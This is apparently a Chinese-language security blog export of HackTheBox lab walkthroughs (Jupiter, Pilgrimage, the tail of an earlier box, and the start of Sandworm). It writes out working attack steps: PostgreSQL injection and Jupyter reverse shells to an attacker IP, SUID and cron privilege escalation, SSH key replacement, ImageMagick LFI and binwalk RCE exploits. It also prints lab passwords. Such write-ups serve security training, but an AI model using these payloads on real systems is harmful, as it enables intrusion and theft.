            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key has already been provisioned for this user"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    prefix <span class="token operator">=</span> <span class="token string">"microblog"</span>
    username <span class="token operator">=</span> r<span class="token punctuation">.</span>hget<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">,</span> <span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    firstlast <span class="token operator">=</span> r<span class="token punctuation">.</span>hget<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">,</span> <span class="token string">"first-name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>hget<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">,</span> <span class="token string">"last-name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    license_key <span class="token operator">=</span> <span class="token punctuation">(</span>prefix <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"{license.license}"</span> <span class="token operator">+</span> firstlast<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>license<span class="token operator">=</span>l<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Plaintext license key:"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------------------"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>license_key<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    license_key_encoded <span class="token operator">=</span> license_key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    license_key_encrypted <span class="token operator">=</span> f<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>license_key_encoded<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Encrypted license key (distribute to customer):"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------------------"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>license_key_encrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/root/license/keys"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> license_keys_file<span class="token punctuation">:</span>
        license_keys_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> license_key_encrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>

<span class="token comment">#deprovision</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>deprovision<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key deprovisioning coming soon"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">#check</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>check<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        license_key_decrypted <span class="token operator">=</span> f<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>args<span class="token punctuation">.</span>check<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key valid! Decrypted value:"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------------------"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>license_key_decrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key invalid"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="五、python格式化字符串漏洞"><a href="#五、python格式化字符串漏洞" class="headerlink" title="五、python格式化字符串漏洞"></a>五、python格式化字符串漏洞</h2><p>python格式化字符串漏洞</p>
<p><a href="https://podalirius.net/en/articles/python-format-string-vulnerabilities/">https://podalirius.net/en/articles/python-format-string-vulnerabilities/</a></p>
<p>连接redis</p>
<pre class="line-numbers language-none"><code class="language-none">redis-cli -s /run/redis/redis.sock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后执行如下命令，以明文形式获取口令</p>
<pre class="line-numbers language-none"><code class="language-none">HMSET test first-name "{license.__init__.__globals__[secret_encoded]}" last-name test username test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>执行如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/license -p test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927161244025.png"></p>
<p>口令如下</p>
<pre class="line-numbers language-none"><code class="language-none">unCR4ckaBL3Pa$$w0rd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功获取root权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927161336159.png"></p>
<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927161500540.png" style="zoom: 67%;">]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>redis未授权</tag>
        <tag>python格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Jupiter</title>
    <url>/posts/d4f5920f.html</url>
    <content><![CDATA[<h1 id="HTB-Jupiter"><a href="#HTB-Jupiter" class="headerlink" title="HTB-Jupiter"></a>HTB-Jupiter</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.信息收集发现子域，子域api存在PostgreSQL注入；</p>
<p>2.PostgreSQL注入反弹shell获取<code>postgres</code>用户权限；</p>
<p>3.查看<code>/etc/passwd</code>发现<code>juno</code>和<code>jovian</code>用户；</p>
<p>4.<code>juno</code>用户有定时任务文件并存在命令执行；</p>
<p>5.命令执行suid提权获取<code>juno</code>用户权限；</p>
<p>6.查看端口开放状态发现<code>Jupyter</code>服务；</p>
<p>7.ssh公钥伪造实现端口转发；</p>
<p>8.token泄露成功登录并通过<code>Jupyter</code>反弹shell获取<code>jovian</code>用户权限；</p>
<p>9.sudo -l发现任意文件读取获取root文件。</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap扫描端口服务</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010100228960.png"></p>
<p>80端口开放，有域名，写入本地hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.216 jupiter.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>浏览器访问，首页如下图</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010101337440.png" style="zoom: 67%;">

<p>扫描子域</p>
<pre class="line-numbers language-none"><code class="language-none">gobuster vhost -u http://jupiter.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010103659223.png"></p>
<p>发现子域<code>kiosk.jupiter.htb</code>，写入本地hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.216 kiosk.jupiter.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问子域</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010103833540.png"></p>
<p>由标签页标题判断出是Grafana框架，访问的同时Burp抓包看到如下api，其中有PostgresSQL语句执行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010105548771.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010105518818.png"></p>
<h2 id="三、PostgreSQL注入反弹shell"><a href="#三、PostgreSQL注入反弹shell" class="headerlink" title="三、PostgreSQL注入反弹shell"></a>三、PostgreSQL注入反弹shell</h2><p>参考：<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#cve-20199193">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#cve-20199193</a></p>
<p>存在注入（可用<code>SELECT version()</code>测试是否存在sql注入）</p>
<p>提前在本地kali开启监听，依次执行如下命令反弹shell</p>
<pre class="line-numbers language-none"><code class="language-none">DROP TABLE IF EXISTS cmd_exec;

CREATE TABLE cmd_exec(cmd_output text);

COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.5/9898 0&gt;&amp;1\"';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010110050116.png" style="zoom: 80%;">

<p>成功获取<code>postgres</code>用户权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010110117546.png"></p>
<p>查看<code>/etc/passwd</code>，除root外还有两个用户：<code>juno</code>和<code>jovian</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010111138516.png"></p>
<h2 id="四、定时任务命令执行suid提权"><a href="#四、定时任务命令执行suid提权" class="headerlink" title="四、定时任务命令执行suid提权"></a>四、定时任务命令执行suid提权</h2><p>查找属于用户 <code>juno</code> 的文件和目录（经尝试，<code>jovian</code>用户的文件<code>postgres</code>用户无可读权限）</p>
<pre class="line-numbers language-none"><code class="language-none">find / -user juno 2&gt;/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010134124990.png"></p>
<p>查看与众不同的文件</p>
<pre class="line-numbers language-none"><code class="language-none">cat /dev/shm/network-simulation.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010134545805.png"></p>
<p>此处执行pspy64，对比执行结果，可看到下侧server和client的path和args会被当作命令执行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010164458642.png"></p>
<p>切换成交互式shell（方便编辑文件）</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>修改<code>vim /dev/shm/network-simulation.yml</code></p>
<pre class="line-numbers language-none"><code class="language-none">- path: /usr/bin/cp
  args: /bin/bash /tmp/bash

- path: /usr/bin/chmod
  args: u+s /tmp/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>稍等片刻，可看到<code>/tmp/bash</code>文件有了suid</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010140724460.png"></p>
<p>执行如下命令提权，成功获取<code>juno</code>用户权限</p>
<pre class="line-numbers language-none"><code class="language-none">/tmp/bash -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010141036273.png"></p>
<p>进入<code>juno</code>用户home目录下查看</p>
<pre class="line-numbers language-none"><code class="language-none">cd /home/juno
ls la<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p> <code>juno</code> 用户没有<code>user.txt</code>读权限，但可看到有<code>.ssh</code>目录</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010141231076.png"></p>
<h2 id="五、ssh公钥伪造"><a href="#五、ssh公钥伪造" class="headerlink" title="五、ssh公钥伪造"></a>五、ssh公钥伪造</h2><p>看到有认证密钥，可以伪造ssh密钥连接</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010142509889.png"></p>
<p>本地用<code>ssh-keygen</code>生成ssh公私钥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010142255050.png"></p>
<p>传到靶机，并覆盖掉原来的密钥文件<code>authorized_keys</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010142554012.png"></p>
<p>如果本地kali不是root用户生成的密钥，需要用<code>chmod 600 id_rsa</code>给私钥添加权限</p>
<p>用如下命令通过私钥连接ssh</p>
<pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa juno@10.10.11.216<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010143240849.png"></p>
<p>查看端口服务</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010144058201.png"></p>
<p>本地kali开启ssh端口转发</p>
<pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa -L 8888:127.0.0.1:8888 juno@10.10.11.216<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后浏览器访问<code>localhost:8888</code>，需要password或token登录</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010145317035.png"></p>
<h2 id="六、登录凭据泄露二次反弹shell"><a href="#六、登录凭据泄露二次反弹shell" class="headerlink" title="六、登录凭据泄露二次反弹shell"></a>六、登录凭据泄露二次反弹shell</h2><p>之前说<code>jovian</code>用户的文件<code>postgres</code>用户无可读权限，此时我们看一下，有个目录<code>/opt/solar-flares</code></p>
<pre class="line-numbers language-none"><code class="language-none">find / -user jovian 2&gt;/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010144515981.png"></p>
<p>在<code>/opt/solar-flares/logs</code>目录下有日志文件，随便打开一个看会有token</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010145731032.png"></p>
<p>那么可用如下命令查看所有文件内的所有token</p>
<pre class="line-numbers language-none"><code class="language-none">cat * | grep “token”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010145907085.png"></p>
<p>token很多，用最后一个，因为最后一个是最近登录的有效token，成功登录</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010150042662.png"></p>
<p>打开<code>flares.ipynb</code>，点击上侧菜单栏<code>File</code>→<code>New Notebook</code>→<code>Python3 (ipykernel)</code> 新建一个脚本</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010151813888.png"></p>
<p>写入反弹shell脚本</p>
<pre class="line-numbers language-none"><code class="language-none">import os; os.system('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.5/9898 0&gt;&amp;1"')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010152100908.png"></p>
<p>本地kali开启监听，点击Run，成功获取<code>jovian</code>用户权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010152212220.png"></p>
<h2 id="七、任意文件读取获取root文件"><a href="#七、任意文件读取获取root文件" class="headerlink" title="七、任意文件读取获取root文件"></a>七、任意文件读取获取root文件</h2><p><code>sudo -l</code>查看可执行的命令</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010152305213.png"></p>
<p>执行，提示没找到配置文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010170332042.png"></p>
<p>用strings分析一下这个命令文件里可能有什么配置文件</p>
<pre class="line-numbers language-none"><code class="language-none">strings /usr/local/bin/sattrack | grep -i config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010155633302.png"></p>
<p>看到有<code>/tmp/config.json</code>，但实际去找的时候却没有，于是用如下命令查找<code>config.json</code></p>
<pre class="line-numbers language-none"><code class="language-none">find / -name config.json 2&gt;/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010155700034.png"></p>
<p>发现<code>/usr/local/share/sattrack/config.json</code>，猜测应该是执行命令的时候会从<code>/tmp</code>目录读取配置文件，那么我们将配置文件复制到<code>/tmp/config.json</code></p>
<pre class="line-numbers language-none"><code class="language-none">cp /usr/local/share/sattrack/config.json /tmp/config.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查看配置文件内容</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010155829789.png"></p>
<p>再次执行命令，发现tmp目录下生成了一个tle目录，目录内是配置文件中<code>tlesources</code>的内容，猜测应该是从目标链接把文件下载到tle目录</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010173152484.png"></p>
<p>那么我们修改配置文件<code>tlesources</code>为如下，直接读取root.txt</p>
<pre class="line-numbers language-none"><code class="language-none">file:///root/root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010161114463.png"></p>
<p>再次执行，发现root.txt成功被读取出来，任意文件读取</p>
<pre class="line-numbers language-none"><code class="language-none">sudo /usr/local/bin/sattrack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010161211605.png"></p>
<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010170408938.png" style="zoom:67%;">

]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>PostgreSQL注入</tag>
        <tag>ssh公钥伪造</tag>
        <tag>Jupyter服务</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Pilgrimage</title>
    <url>/posts/3e4c0ff8.html</url>
    <content><![CDATA[<h1 id="HTB-Pilgrimage"><a href="#HTB-Pilgrimage" class="headerlink" title="HTB-Pilgrimage"></a>HTB-Pilgrimage</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.nmap端口扫描发现git源码泄露；</p>
<p>2.读源码发现压缩图片用的magick命令，且发现数据库文件绝对路径；</p>
<p>3.ImageMagick LFI读取ssh账户用户名口令；</p>
<p>4.运行pspy64发现有监视任务；</p>
<p>5.binwalk RCE提权获取root权限。</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap扫描端口服务</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007111005798.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007111425518.png"></p>
<p>80端口开放，有域名，写入本地hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.219 pilgrimage.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>浏览器访问</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007111101520.png" style="zoom: 67%;">

<p>主页是一个压缩图片的功能，上传文件，点击Shrink，成功后会返回图片链接</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007134544764.png"></p>
<p>nmap扫描结果看到有git仓库</p>
<p>用git-dumper把git仓库下载下来：<a href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a></p>
<pre class="line-numbers language-none"><code class="language-none">python3 git_dumper.py http://pilgrimage.htb/.git/ ./pilgrimage/git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>主要代码如下</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007133646940.png" style="zoom: 80%;">

<p>在<code>index.php</code>看到会执行<code>/var/www/pilgrimage.htb/magick</code>，还有sqlite数据库文件<code>/var/db/pilgrimage</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007134240850.png"></p>
<h2 id="三、ImageMagick-LFI（CVE-2022-44268）"><a href="#三、ImageMagick-LFI（CVE-2022-44268）" class="headerlink" title="三、ImageMagick LFI（CVE-2022-44268）"></a>三、ImageMagick LFI（CVE-2022-44268）</h2><p>google关键字：ImageMagick poc</p>
<p><a href="https://github.com/Sybil-Scan/imagemagick-lfi-poc">https://github.com/Sybil-Scan/imagemagick-lfi-poc</a></p>
<p>用脚本生成恶意图片</p>
<pre class="line-numbers language-none"><code class="language-none">python3 generate.py -f "/etc/passwd" -o exploit.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007134913194.png"></p>
<p>在网站首页上传，然后用返回的链接下载</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://pilgrimage.htb/shrunk/6520f1b11b130.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>再用如下命令查看图片详细信息</p>
<pre class="line-numbers language-none"><code class="language-none">identify -verbose 6520f1b11b130.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>图片的部分十六进制编码如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007135439660.png"></p>
<p>十六进制解码：<a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007135515096.png"></p>
<p>可看到读取到的<code>/etc/passwd</code>内容，其中有一个非常规用户<code>emily</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007135740333.png"></p>
<p>刚才在<code>index.php</code>看到的sqlite数据库文件<code>/var/db/pilgrimage</code>，同样用上述方法读取</p>
<pre class="line-numbers language-none"><code class="language-none">python3 generate.py -f "/var/db/pilgrimage" -o exploit.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>部分关键编码如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007140339311.png"></p>
<p>看到有emily用户的用户名口令</p>
<pre class="line-numbers language-none"><code class="language-none">emily
abigchonkyboi123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ssh连接</p>
<pre class="line-numbers language-none"><code class="language-none">ssh emily@10.10.11.219<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007140421955.png"></p>
<h2 id="四、binwalk-RCE提权"><a href="#四、binwalk-RCE提权" class="headerlink" title="四、binwalk RCE提权"></a>四、binwalk RCE提权</h2><p>连上ssh后，在靶机运行pspy64，看到有<code>/usr/sbin/malwarescan.sh</code>脚本，另外</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007141040913.png"></p>
<blockquote>
<p>解释命令：<code>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/</code></p>
<p>-m：进入监视模式（monitor mode）；</p>
<p>-e create：监视文件的创建事件；</p>
<p>当 <code>/var/www/pilgrimage.htb/shrunk/</code> 目录中有新文件被创建时，将显示相关信息。</p>
</blockquote>
<p>查看<code>/usr/sbin/malwarescan.sh</code>，会把<code>/var/www/pilgrimage.htb/shrunk/</code> 目录新创建的文件用<code>binwalk</code>处理，那么就尝试看binwalk有没有可利用点</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007141344752.png"></p>
<p>查看binwalk版本</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007141501172.png"></p>
<p>google发现对应版本binwalk存在RCE</p>
<p><a href="https://www.exploit-db.com/exploits/51249">https://www.exploit-db.com/exploits/51249</a></p>
<p>随便找一张图片wa0er.png作为输入，执行脚本</p>
<pre class="line-numbers language-none"><code class="language-none">python3 exploit.py wa0er.png 10.10.14.5 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本地kali执行如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898	#开启监听
python3 -m http.server 80	#开启http服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>靶机执行如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">cd /var/www/pilgrimage.htb/shrunk/
wget http://10.10.14.5/binwalk_exploit.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>成功反弹shell，获取root权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007143747196.png"></p>
<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231007154416524.png" style="zoom:67%;">]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>git源码泄露</tag>
        <tag>ImageMagick LFI</tag>
        <tag>binwalk RCE提权</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Sandworm</title>
    <url>/posts/5f6105d4.html</url>
    <content><![CDATA[<h1 id="HTB-Sandworm"><a href="#HTB-Sandworm" class="headerlink" title="HTB-Sandworm"></a>HTB-Sandworm</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.端口扫描发现域名，目录扫描发现PGP签名验证功能；</p>
<p>2.签名验证功能存在Flask模板注入；</p>
<p>3.Flask模板注入反弹shell获取<code>atlas</code>用户web权限；</p>
<p>4.配置文件信息泄露获取ssh账户<code>silentobserver</code>；</p>
<p>5.登录ssh账户，运行pspy64和linpeas发现计划任务和SUID文件；</p>
<p>6.Rust计划任务提权获取<code>atlas</code>在<code>jailer</code>组的shell权限；</p>
<p>7.<code>firejail</code>的SUID提权获取root权限。</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap扫描端口服务</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102130015615.png"></p>
<p>发现域名，写入本地hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.218 ssa.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>浏览器访问，没什么有价值的东西</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102130626254.png" style="zoom: 67%;">

<p>扫描目录</p>
